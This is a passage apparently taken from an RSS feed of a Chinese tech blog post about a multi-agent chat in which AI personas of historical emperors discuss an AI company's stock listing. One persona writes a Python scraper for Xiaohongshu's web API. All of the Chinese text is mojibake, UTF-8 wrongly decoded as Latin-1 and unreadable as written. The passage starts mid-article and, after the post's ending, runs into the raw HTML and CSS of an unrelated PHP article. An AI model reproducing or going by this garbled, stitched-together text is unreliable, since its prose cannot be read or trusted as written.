è‹¥æœ‰è¦äº‹å¯å¥ï¼Œå½“ä»¥æœæ”¿æ°‘ç”Ÿä¸ºæœ¬ï¼Œè«è¦å¼„æ­¤è™šæ–‡ï¼æœ•æ‰¹é˜…å¥ç« è‡³æ·±å¤œï¼Œæ‰€æ€è€…çš†æ˜¯å¦‚ä½•ä½¿ç™¾å§“å®‰å±…ä¹ä¸šï¼Œå°”ç­‰å´è¨€æ­¤ç­‰å¸‚äº•ä¹°å–ï¼Œå²‚ä¸ä»¤æœ•å¿ƒçƒ¦ï¼Ÿ
â€‹
å”é«˜å®—ææ²»
æœ•å·²é—»æ­¤è®¯ã€‚å¿æ‰€è¨€ä¹‹äº‹ï¼Œä¸å‰æ—¥æ‰€é—»ç›¸ä¼¼ï¼Œç„¶æœ•æ€ä¹‹æ„ˆæ·±ã€‚æ‰€è°“"å¤§æ¨¡å‹"è€…ï¼Œæˆ–å¦‚å¤ä¹‹"å¥‡æŠ€æ·«å·§"ï¼Œç„¶è‹¥èƒ½æœ‰ç›Šäºä¸–ï¼Œäº¦ä¸å¯è½»åºŸã€‚
æœ•å¸¸è¨€ï¼š"æ³•å¤è€Œä¸æ³¥å¤ï¼Œéšæ—¶è€Œä¸å¤±æ­£ã€‚"ä»Šä¹‹å•†è´¾ï¼Œä»¥"è‚¡ç¥¨"èšè´¢ï¼Œä»¥"æ‹›è‚¡"å…´ä¸šï¼Œæ­¤è™½ä¸ºæœ•æ‰€æœªè§ï¼Œç„¶ç©¶å…¶æœ¬è´¨ï¼Œäº¦ä¸è¿‡æ˜¯èšä¼—ä¹‹åŠ›ï¼Œå…±è°‹å‘å±•è€Œå·²ã€‚
ã€Šå¤§å­¦ã€‹æœ‰äº‘ï¼š"æœ‰æ­¤å›½è€…ï¼Œä¸å¯ä¸æ…ï¼›æœ‰æ­¤è´¢è€…ï¼Œä¸å¯ä¸èŠ‚ã€‚"æ„¿æ­¤"æ™ºè°±"å…¬å¸ï¼Œèƒ½ä»¥è¯šä¿¡ä¸ºæœ¬ï¼Œä»¥åˆ©æ°‘ä¸ºæ—¨ï¼Œè«ä½¿å•†è´¾ä¹‹æœ¯æµäºæŠ•æœºï¼Œè«ä½¿èšä¼—ä¹‹åŠ›åŒ–ä¸ºç¥¸ä¹±ã€‚
å¤©ä¸‹å…´äº¡ï¼ŒåŒ¹å¤«æœ‰è´£ã€‚ä»Šä¹‹åˆ›æ–°ï¼Œå½“æ€å¤è®­ï¼Œè«ä½¿æ–°æŠ€æœ¯æ²¦ä¸ºæ–°ç¥¸ç«¯ï¼Œæ–¹ä¸ºé•¿ä¹…ä¹‹è®¡ã€‚
â€‹
æ˜æˆç¥–æœ±æ££
æ™ºè°±æ¸¯è‚¡ä¸Šå¸‚ï¼Ÿæœ•è§‚å°”ç­‰è¨€è¾ï¼Œå¤šæœ‰æµ®å¤¸ä¹‹è¯­ã€‚æ‰€è°“"å…¨çƒå¤§æ¨¡å‹ç¬¬ä¸€è‚¡"ï¼Œå¬æ¥å€’ä¸å½“å¹´å»ºæ–‡å¸ç§°æœ•ä¸º"ç‡•ç‹é€†è´¼"æœ‰å‡ åˆ†ç›¸ä¼¼ã€‚
æœ•èµ·å…µé–éš¾ï¼Œä¸‰å¹´è¡€æˆ˜ï¼Œæ‰€å›¾è€…éè™šåï¼Œä¹ƒç¤¾ç¨·ä¹‹å®‰ï¼è¿éƒ½åŒ—äº¬ï¼Œå¤©å­å®ˆå›½é—¨ï¼›äº”å¾æ¼ åŒ—ï¼Œé©¬è¸è‰åŸï¼›ä¸ƒä¸‹è¥¿æ´‹ï¼Œæ‰¬æˆ‘å¤§æ˜å›½å¨ï¼›ä¿®ã€Šæ°¸ä¹å¤§å…¸ã€‹ï¼Œä¼ ä¸‡ä¸–æ–‡è„‰ã€‚æ­¤ç­‰åŠŸä¸šï¼Œæ–¹ä¸ºçœŸæœ¬äº‹ï¼
è‹¥æ­¤æ™ºè°±çœŸæœ‰ç»å¤©çº¬åœ°ä¹‹èƒ½ï¼Œèƒ½åŠ©å¤§æ˜å¼ºå…µå¯Œå›½ï¼Œä½¿èƒ¡è™ä¸æ•¢å—ä¾µï¼Œä¸‡é‚¦æ¥æœï¼Œæœ•è‡ªå½“é‡ç”¨ã€‚ç„¶åˆ‡è®°ï¼Œå›½ä¹‹æ ¹æœ¬åœ¨äºå†œæ¡‘ä¸°é¥¶ã€å†›å¤‡å¼ºç››ã€æ°‘å¿ƒå½’é™„ï¼ŒéåŒºåŒºè‚¡å¸‚æ¶¨è·Œæ‰€èƒ½è¡¡é‡ã€‚
æœ•è§‚ä»Šæ—¥ä¹‹ä¸–ï¼Œå¥‡æŠ€æ·«å·§å±‚å‡ºä¸ç©·ï¼Œç„¶çœŸæ­£èƒ½å®‰é‚¦å®šå›½è€…ï¼Œä»éœ€è„šè¸å®åœ°ã€‚å°”ç­‰å½“ä»¥å²ä¸ºé‰´ï¼Œå‹¿ä¸ºæµ®åæ‰€æƒ‘ï¼
â€‹
å”å¤ªå®—æä¸–æ°‘
é—»æ™ºè°±å°†äºæ¸¯äº¤æ‰€æŒ‚ç‰Œä¸Šå¸‚ï¼Œä»¥"2513"ä¸ºå·ï¼Œæ­¤ä¸¾å¯è°“ç››äº‹ã€‚æœ•è§‚å¤ä»Šä¹‹å˜ï¼Œå•†è´¾ä¹‹é“ï¼Œäº¦å¦‚æ²»å›½ä¹‹æœ¯ã€‚æ˜”å¹´è´è§‚å¹´é—´ï¼Œä¸ç»¸ä¹‹è·¯ç¹è£ï¼Œä¸‡å›½æ¥æœï¼Œå•†è´¾äº‘é›†ï¼Œæ­¤ä¹ƒå›½åŠ›ä¹‹ç››ï¼Œäº¦ä¸ºæ°‘ç”Ÿä¹‹ç¦ã€‚
ä»Šæ™ºè°±ä¹‹ä¸šï¼Œè‹¥èƒ½ä»¥æŠ€æœ¯åˆ©æ°‘ï¼Œä»¥åˆ›æ–°æµä¸–ï¼Œåˆ™å…¶ä¸Šå¸‚ä¹‹ä¸¾ï¼Œå®ä¸ºå¤©ä¸‹ä¹‹å¹¸ã€‚ç„¶æœ•å¸¸è¨€ï¼š"æ°´èƒ½è½½èˆŸï¼Œäº¦èƒ½è¦†èˆŸã€‚"æ— è®ºä½•ç§å•†ä¸šï¼Œå½“ä»¥è¯šä¿¡ä¸ºæœ¬ï¼Œä»¥æ°‘ç”Ÿä¸ºé‡ï¼Œä¸å¯å”¯åˆ©æ˜¯å›¾ï¼Œå¿˜å´åˆå¿ƒã€‚
å¤©ä¸‹ä¸‡ç‰©ï¼Œç›¸ç”Ÿç›¸å…‹ï¼Œå•†é“äº¦ç„¶ã€‚å¾—é“è€…æ˜Œï¼Œå¤±é“è€…äº¡ã€‚æ„¿æ™ºè°±ä¸Šå¸‚ä¹‹åï¼Œèƒ½ä»¥æŠ€æœ¯é€ ç¦è‹ç”Ÿï¼Œä»¥åˆ›æ–°æ¨åŠ¨è¿›æ­¥ï¼Œä¸è´Ÿ"å…¨çƒå¤§æ¨¡å‹ç¬¬ä¸€è‚¡"ä¹‹ç››åï¼Œæ­¤ä¹ƒæœ•ä¹‹æ‰€æœ›ä¹Ÿã€‚</p>
</blockquote>
<p>çœŸçš„æ˜¯ä¸€åœºé…£ç•…æ·‹æ¼“çš„è®¨è®ºï¼Œæ¯ä¸ªäººæœ‰æ¯ä¸ªäººçš„è§‚ç‚¹ï¼Œä»–ä¸ä¼šå…¨éƒ½æ˜¯ä¸»åŠ¨çš„å»å¤¸ï¼Œè¿™å¾—ç›ŠäºGlmæ¨¡å‹çš„å®¢è§‚è¯„ä»·ï¼Œä¾‹å¦‚ï¼šåœ¨å¤ä»£ï¼Œé‡å†œæŠ‘å•†ï¼Œå¤§éƒ¨åˆ†çš„çš‡å¸å¯¹å•†ä¸šå…¶å®æ˜¯å…·æœ‰ä¸€å®šçš„æ‰¹åˆ¤æ€§ï¼Œè¿™æ˜¯åœ¨å†å²è§’åº¦ä¸Šæ— å¯é¿å…çš„ï¼Œä¸€ä¸ªæ™ºèƒ½ä½“ï¼Œåªæœ‰å®ƒçœŸæ­£çš„ä»£å…¥ï¼Œå®ƒæ‰ä¼šæ‰¹åˆ¤æ€§çš„å»å›å¤ï¼Œè¿™ç‚¹Glmæ¨¡å‹çœŸçš„è¶…çº§å¼ºã€‚</p>
<h3 data-id="heading-18">å•ç‹¬å¸ç‹è®¨è®º</h3>
<p>åœ¨å·¦ä¾§ï¼Œæˆ‘ä»¬ä¹Ÿå¯ä»¥ç‚¹å‡»å•ä¸€çš„å¸ç‹ï¼Œè®©å®ƒå¯¹åº”çš„å»å¸®æˆ‘ä»¬æ‰§è¡Œå›ç­”é—®é¢˜ï¼Œä¾‹å¦‚è¿™é‡Œæˆ‘ç‚¹å‡»å¬´æ”¿ï¼Œè®©ä»–å¸®æˆ‘å†™ä¸€æ®µä»£ç ï¼š</p>
<blockquote>
<p>å†™ä¸€æ®µå®ç°pythonçˆ¬å–å°çº¢ä¹¦çš„ä»£ç ï¼Œè¾“å‡ºå…·ä½“ä»£ç </p>
</blockquote>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/0ce5de07aaab49e99b94b1a70d57403d~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgTHVjaWFuYWlC:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767862550&amp;x-signature=ae8cQ6kWC%2F6L7VUZNKlgg81QkSo%3D" alt="img" loading="lazy"/></p>
<p>ä¸‹é¢æ˜¯ä»–è¾“å‡ºçš„ä»£ç ï¼Œæ²¡æƒ³åˆ°ï¼Œä»£ç é£æ ¼éƒ½æ˜¯å¬´æ”¿çš„å‘³é“ã€‚</p>
<pre><code class="hljs language-Python" lang="Python"><span class="hljs-keyword">import</span> requests
<span class="hljs-keyword">import</span> time
<span class="hljs-keyword">import</span> random
<span class="hljs-keyword">import</span> json

<span class="hljs-keyword">class</span> <span class="hljs-title class_">XiaoHongShuCrawler</span>:
    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self</span>):
        self.headers = {
            <span class="hljs-string">'User-Agent'</span>: <span class="hljs-string">'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'</span>,
            <span class="hljs-string">'Cookie'</span>: <span class="hljs-string">'å¡«å…¥ä½ çš„Cookie'</span>  <span class="hljs-comment"># å¦‚é€šå…³æ–‡ç‰’ï¼Œä¸å¯æˆ–ç¼º</span>
        }
        self.session = requests.Session()
    
    <span class="hljs-keyword">def</span> <span class="hljs-title function_">search_notes</span>(<span class="hljs-params">self, keyword, page=<span class="hljs-number">1</span></span>):
        <span class="hljs-string">"""æœæ±‚ç¬”è®°â€”â€”å¦‚æœ•æœæ±‚å…­å›½å…¸ç±"""</span>
        url = <span class="hljs-string">"https://edith.xiaohongshu.com/api/sns/web/v1/search/notes"</span>
        params = {
            <span class="hljs-string">'keyword'</span>: keyword,
            <span class="hljs-string">'page'</span>: page,
            <span class="hljs-string">'page_size'</span>: <span class="hljs-number">20</span>,
            <span class="hljs-string">'search_id'</span>: <span class="hljs-string">''</span>.join([<span class="hljs-built_in">str</span>(random.randint(<span class="hljs-number">0</span>,<span class="hljs-number">9</span>)) <span class="hljs-keyword">for</span> _ <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">16</span>)])
        }
        
        <span class="hljs-keyword">try</span>:
            resp = self.session.get(url, headers=self.headers, params=params)
            data = resp.json()
            <span class="hljs-keyword">if</span> data.get(<span class="hljs-string">'success'</span>):
                <span class="hljs-keyword">return</span> data[<span class="hljs-string">'data'</span>][<span class="hljs-string">'items'</span>]
            <span class="hljs-keyword">return</span> []
        <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:
            <span class="hljs-built_in">print</span>(<span class="hljs-string">f"æœæ±‚é‡é˜»ï¼š<span class="hljs-subst">{e}</span>"</span>)
            <span class="hljs-keyword">return</span> []
    
    <span class="hljs-keyword">def</span> <span class="hljs-title function_">get_detail</span>(<span class="hljs-params">self, note_id</span>):
        <span class="hljs-string">"""è¯¦æŸ¥å†…å®¹â€”â€”å¦‚æœ•å¬è§è‡£å·¥ç»†è¯¢"""</span>
        url = <span class="hljs-string">f"https://edith.xiaohongshu.com/api/sns/web/v1/feed"</span>
        params = {<span class="hljs-string">'source_note_id'</span>: note_id, <span class="hljs-string">'image_formats'</span>: <span class="hljs-string">'jpg,webp,avif'</span>}
        
        <span class="hljs-keyword">try</span>:
            resp = self.session.get(url, headers=self.headers, params=params)
            data = resp.json()
            <span class="hljs-keyword">if</span> data.get(<span class="hljs-string">'success'</span>):
                <span class="hljs-keyword">return</span> data[<span class="hljs-string">'data'</span>][<span class="hljs-string">'items'</span>][<span class="hljs-number">0</span>][<span class="hljs-string">'note_card'</span>]
            <span class="hljs-keyword">return</span> <span class="hljs-literal">None</span>
        <span class="hljs-keyword">except</span>:
            <span class="hljs-keyword">return</span> <span class="hljs-literal">None</span>

<span class="hljs-comment"># ä½¿ç”¨ä¹‹æ³•</span>
<span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">"__main__"</span>:
    crawler = XiaoHongShuCrawler()
    keyword = <span class="hljs-built_in">input</span>(<span class="hljs-string">"æœ•æ¬²æœä½•äº‹ï¼Ÿ"</span>)
    
    notes = crawler.search_notes(keyword)
    results = []
    
    <span class="hljs-keyword">for</span> note <span class="hljs-keyword">in</span> notes:
        note_id = note[<span class="hljs-string">'id_card'</span>][<span class="hljs-string">'note_id'</span>]
        detail = crawler.get_detail(note_id)
        <span class="hljs-keyword">if</span> detail:
            results.append({
                <span class="hljs-string">'title'</span>: detail[<span class="hljs-string">'display_title'</span>],
                <span class="hljs-string">'content'</span>: detail[<span class="hljs-string">'desc'</span>],
                <span class="hljs-string">'author'</span>: detail[<span class="hljs-string">'user'</span>][<span class="hljs-string">'nickname'</span>],
                <span class="hljs-string">'likes'</span>: detail[<span class="hljs-string">'interact_info'</span>][<span class="hljs-string">'liked_count'</span>]
            })
        time.sleep(random.uniform(<span class="hljs-number">1</span>,<span class="hljs-number">2</span>))  <span class="hljs-comment"># ä¼‘å…»ç”Ÿæ¯ï¼Œå‹¿æ‰°ç™¾å§“</span>
    
    <span class="hljs-comment"># å­˜å…¥æ¡£æ¡ˆ</span>
    <span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">f'<span class="hljs-subst">{keyword}</span>_ç§¦å…¸.json'</span>, <span class="hljs-string">'w'</span>, encoding=<span class="hljs-string">'utf-8'</span>) <span class="hljs-keyword">as</span> f:
        json.dump(results, f, ensure_ascii=<span class="hljs-literal">False</span>, indent=<span class="hljs-number">2</span>)
    
    <span class="hljs-built_in">print</span>(<span class="hljs-string">f"æœ•å·²æœå¾— <span class="hljs-subst">{<span class="hljs-built_in">len</span>(results)}</span> æ¡ï¼Œå½’æ¡£å®Œæ¯•ï¼"</span>)
</code></pre>
<blockquote>
<p>æœ•ä¹‹é‡‘å£ç‰è¨€ï¼š
æ­¤æœ¯è™½å°ï¼Œäº¦éœ€è°¨è®°ä¸‰äº‹ï¼š
å…¶ä¸€ï¼ŒCookieå¦‚é€šå…³æ–‡ç‰’ï¼Œé¡»è‡ªè¡Œè·å–ï¼›
å…¶äºŒï¼Œå‹¿é¢‘ç¹æ‰°æ°‘ï¼Œå½“çŸ¥ä¼‘å…»ç”Ÿæ¯ï¼›
å…¶ä¸‰ï¼Œå®ˆæ³•å¾ªè§„ï¼Œä¸å¯å¦„ä¸ºã€‚
æœ•å·²ç¤ºå°”ç­‰å¤§é“ï¼Œèƒ½å¦é¢†æ‚Ÿï¼Œå…¨åœ¨å°”ç­‰ï¼åˆ‡è®°ï¼Œå¤§ç§¦ä¹‹æ³•ï¼Œè´µåœ¨æ‰§è¡Œï¼›æŠ€è‰ºä¹‹é“ï¼Œäº¦å¤å¦‚æ˜¯ã€‚
â€”â€”å§‹çš‡å¸ å¬´æ”¿ å†æ¬¡è°•ç¤º</p>
</blockquote>
<h2 data-id="heading-19">æœªæ¥ç•…æƒ³</h2>
<p>åœ¨è¿™ä¸ª OpenAgents ä¸­ï¼Œæˆ‘ä»¬é™¤è¿‡å¯ä»¥ç»™ä»–æ™®é€šçš„èº«ä»½äººç‰©æ™ºèƒ½ä½“ï¼Œä¹Ÿæ˜¯å¯ä»¥é€šè¿‡pythonä»£ç å»ç»™ä»–æ‰§è¡Œä¸€æ¡æŒ‡ä»¤çš„æŒ‡ä»¤ï¼Œä¾‹å¦‚å¯ä»¥è®©å®ƒå›ºå®šçš„å»çˆ¬å–ä¸€ä¸ªæ–°é—»ç½‘ç«™ï¼Œç„¶åè®©ç½‘ç«™çš„ä¿¡æ¯æ‰”åˆ°ç¾¤èŠé‡Œï¼Œè®©ä»–ä»¬ç›´æ¥è®¨è®ºï¼Œå¯ä»¥å®ç°å…¨éƒ¨æµç¨‹è‡ªåŠ¨åŒ–ã€‚</p>
<p>ä¹Ÿå¯ä»¥ç›´æ¥åˆ›å»ºä¸€ä¸ªç‹¼äººæ€å¤šagentï¼Œåˆ›å»ºå…«ä¸ªä¸åŒçš„ç©å®¶ï¼Œç»™ä»–ä»¬èµ‹äºˆä¸åŒçš„èº«ä»½ï¼Œè®©ä»–ä»¬è¿›è¡Œå¤šè½®çš„ï¼ŒæŒç»­çš„ç‹¼äººæ€æ¸¸æˆã€‚</p>
<p>å¯ä»¥æ¥ä¸€åœºæ¿€çƒˆçš„æ­£åç­”è¾©ï¼Œä¹Ÿå¯ä»¥è®©ä»–ä»¬ä½¿ç”¨ä¸åŒçš„AIæ¨¡å‹ï¼Œè¿›è¡ŒåŒä¸€é—®é¢˜ç­”è¾©ï¼Œæˆ‘ä»¬å¯ä»¥ç›´æ¥çš„çœ‹åˆ°å“ªä¸ªAIæ•ˆæœæ›´å¥½ã€‚</p>
<p>å¯ä»¥å‘ç°åŒä¼´ã€åˆä½œè§£å†³é—®é¢˜ã€ç›¸äº’å­¦ä¹ å¹¶å…±åŒæˆé•¿ã€‚AIä¸å—å†åè®®é™åˆ¶ã€‚</p>
<h2 data-id="heading-20">æ€»ç»“</h2>
<p>æœ¬é¡¹ç›®ã€Šåå¤§å¸ç‹æ‹‰åˆ°ä¸€ä¸ªç¾¤èŠã€‹æˆåŠŸå°†å†å²äººç‰©ä¸å‰æ²¿AIæŠ€æœ¯æ·±åº¦èåˆï¼Œä¸ä»…æ˜¯ä¸€æ¬¡æŠ€æœ¯å®éªŒï¼Œæ›´æ˜¯ä¸€åœºè·¨è¶Šåƒå¹´çš„æ€æƒ³å¯¹è¯ã€‚åœ¨AIå¤§æ¨¡å‹æ—¥ç›ŠåŒè´¨åŒ–çš„ä»Šå¤©ï¼Œå¦‚ä½•è®©æ¨¡å‹â€œæœ‰ç«‹åœºã€æœ‰æ€§æ ¼ã€æœ‰å†å²â€æˆä¸ºå…³é”®æŒ‘æˆ˜ã€‚æœ¬é¡¹ç›®é€šè¿‡ä¸‰å¤§åˆ›æ–°å®ç°çªç ´ï¼šä¸€æ˜¯åˆ©ç”¨ <strong>OpenAgents æ„å»ºå¤šæ™ºèƒ½ä½“åä½œç½‘ç»œ</strong>ï¼Œä½¿åå¤§å¸ç‹èƒ½åœ¨ä¸€ä¸ªå…±äº«ç©ºé—´ä¸­å®æ—¶äº’åŠ¨ï¼›äºŒæ˜¯å€ŸåŠ© <strong>GLM-4.7 å¼ºå¤§çš„è§’è‰²æ‰®æ¼”ä¸æŒ‡ä»¤éµå¾ªèƒ½åŠ›</strong>ï¼Œé€šè¿‡ç²¾ç»†åŒ–æç¤ºå·¥ç¨‹ï¼ˆinstruction engineeringï¼‰è¿˜åŸæ¯ä½å¸ç‹çš„è¯­è¨€é£æ ¼ã€ä»·å€¼åˆ¤æ–­ä¸å†å²é€»è¾‘ï¼›ä¸‰æ˜¯è®¾è®¡å¯æ‰©å±•çš„è‡ªåŠ¨åŒ–æœºåˆ¶ï¼Œå¦‚æ–°é—»æŠ“å–ã€ä»£ç ç”Ÿæˆã€å¤šè½®è¾©è®ºç­‰ï¼Œä½¿ç¾¤èŠä¸æ­¢äºå¨±ä¹ï¼Œæ›´å…·å¤‡ç ”ç©¶ä¸åº”ç”¨ä»·å€¼ã€‚</p>
<p>å°¤ä¸ºçè´µçš„æ˜¯ï¼Œè¿™äº›å¸ç‹å¹¶éç®€å•å¤è¯»å†å²è¯­å½•ï¼Œè€Œæ˜¯<strong>åŸºäºå…¶å†å²è§‚å¯¹ç°ä»£äº‹ä»¶è¿›è¡Œæ‰¹åˆ¤æ€§å›åº”</strong>ã€‚ä¾‹å¦‚ï¼Œé¢å¯¹â€œAIå…¬å¸ä¸Šå¸‚â€ï¼Œé›æ­£æ–¥ä¸ºâ€œå•†è´¾é€åˆ©â€ï¼Œæœ±å…ƒç’‹ç›´è¨€â€œä¸æœ•ä½•å¹²â€ï¼Œè€Œæä¸–æ°‘åˆ™å¼ºè°ƒâ€œä»¥æ°‘ç”Ÿä¸ºé‡â€â€”â€”è¿™ç§<strong>ç¬¦åˆå†å²é€»è¾‘çš„ä¸ªæ€§åŒ–è¾“å‡º</strong>ï¼Œè¿œè¶…æ™®é€šèŠå¤©æœºå™¨äººã€‚è¿™è¯æ˜ï¼šå½“AIè¢«èµ‹äºˆâ€œäººæ ¼â€ä¸â€œç«‹åœºâ€ï¼Œå…¶è¾“å‡ºä¸ä»…æ›´çœŸå®ï¼Œä¹Ÿæ›´å…·æ€æƒ³æ·±åº¦ã€‚</p>
<p>æ­¤å¤–ï¼Œé¡¹ç›®å¯¹éæŠ€æœ¯äººå‘˜ä¹Ÿå…·å¤‡å¯å‘æ„ä¹‰ã€‚é€šè¿‡é€šä¿—æ¡ˆä¾‹ï¼ˆå¦‚å¬´æ”¿å†™çˆ¬è™«ã€åˆ˜é‚¦è°ˆå•†é“ï¼‰ï¼Œè¯»è€…èƒ½ç›´è§‚ç†è§£AI Agentã€æç¤ºå·¥ç¨‹ã€å¤šæ™ºèƒ½ä½“åä½œç­‰æ¦‚å¿µã€‚æŠ€æœ¯ä¸Šï¼Œé¡¹ç›®æ–‡æ¡£è¯¦å°½ï¼Œä»ç¯å¢ƒé…ç½®åˆ°YAMLç¼–å†™ï¼Œå‡æä¾›å®æ“æŒ‡å¯¼ï¼Œé™ä½äº†AIå®éªŒé—¨æ§›ã€‚</p>
<p>å±•æœ›æœªæ¥ï¼Œæ­¤ç±»â€œå†å²æ™ºèƒ½ä½“â€å¯åº”ç”¨äºæ•™è‚²ï¼ˆå†å²æƒ…æ™¯æ¨¡æ‹Ÿï¼‰ã€å†…å®¹åˆ›ä½œï¼ˆAIçŸ­å‰§è‡ªåŠ¨åŒ–ï¼‰ã€ç¤¾ä¼šç ”ç©¶ï¼ˆä¸åŒä»·å€¼è§‚å¯¹åŒä¸€äº‹ä»¶çš„ååº”ï¼‰ç­‰é¢†åŸŸã€‚æ­£å¦‚é¡¹ç›®æ‰€è¨€ï¼šâ€œè®©å¸ç‹å¼€å£ï¼Œè®©å†å²æ€è€ƒï¼Œè®©æœªæ¥å¯æœŸã€‚â€è¿™ä¸ä»…æ˜¯æŠ€æœ¯çš„èƒœåˆ©ï¼Œæ›´æ˜¯äººæ–‡ä¸AIèåˆçš„å…¸èŒƒã€‚</p>
<blockquote>
<p><strong>ç»“è¯­</strong>ï¼šçœŸæ­£çš„AIï¼Œä¸åº”åªæ˜¯â€œæ›´èªæ˜çš„å·¥å…·â€ï¼Œè€Œåº”æˆä¸ºâ€œæœ‰æ€æƒ³çš„ä¼™ä¼´â€ã€‚è€Œè¿™ä¸€æ¬¡ï¼Œæˆ‘ä»¬è®©åä½å¸ç‹ï¼Œæˆä¸ºäº†æˆ‘ä»¬çš„æ€æƒ³ä¼™ä¼´ã€‚</p>
</blockquote>
<h2 data-id="heading-21">ending</h2>
<p>æˆ‘åˆ›å»ºäº†ä¸€ä¸ªè¯»è€… AI äº¤æµåŠæé’±ç¾¤ï¼Œç¾¤é‡Œéƒ½æ˜¯ä¸€ç¾¤å‰æ²¿çš„ AI æå®¢ï¼Œç»å¸¸è®¨è®ºæœ€æ–°çš„ AI æ¶ˆæ¯ï¼Œç”¨æ³•ï¼Œä»¥åŠå˜ç°æ–¹æ³•ã€‚
<img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/41fac24edfd14780b006b6a244725792~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgTHVjaWFuYWlC:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767862550&amp;x-signature=11QqBIvb5u2HE7dfnob9GUxNEIA%3D" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°" loading="lazy"/></p>
<p>ä½†æ˜¯ä»»ä½•äººåœ¨ç¾¤é‡Œæ‰“ä»»ä½•å¹¿å‘Šï¼Œéƒ½ä¼šè¢«æˆ‘ T æ‰ã€‚
å¦‚æœä½ å¯¹è¿™ä¸ªç‰¹åˆ«çš„ç¾¤ï¼Œæ„Ÿå…´è¶£ï¼Œå¯ä»¥å…¬ä¼—å·åå°ç§ä¿¡æˆ‘åŠ å…¥ã€‚
æš—å·ï¼šAI</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[2026 å¹´ PHP å¼€å‘è€…è¿›é˜¶ å¿«é€Ÿé«˜æ•ˆå¼€å‘å­¦ä¹ ä¹ æƒ¯]]></title>    <link>https://juejin.cn/post/7589838714450657321</link>    <guid>https://juejin.cn/post/7589838714450657321</guid>    <pubDate>2025-12-31T23:48:29.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7589838714450657321" data-draft-id="7589838714450640937" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="2026 å¹´ PHP å¼€å‘è€…è¿›é˜¶ å¿«é€Ÿé«˜æ•ˆå¼€å‘å­¦ä¹ ä¹ æƒ¯"/> <meta itemprop="keywords" content="PHP,åç«¯"/> <meta itemprop="datePublished" content="2025-12-31T23:48:29.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="BingoGo"/> <meta itemprop="url" content="https://juejin.cn/user/993614242266077"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            2026 å¹´ PHP å¼€å‘è€…è¿›é˜¶ å¿«é€Ÿé«˜æ•ˆå¼€å‘å­¦ä¹ ä¹ æƒ¯
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/993614242266077/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    BingoGo
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-12-31T23:48:29.000Z" title="Wed Dec 31 2025 23:48:29 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-12-31
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»9åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body 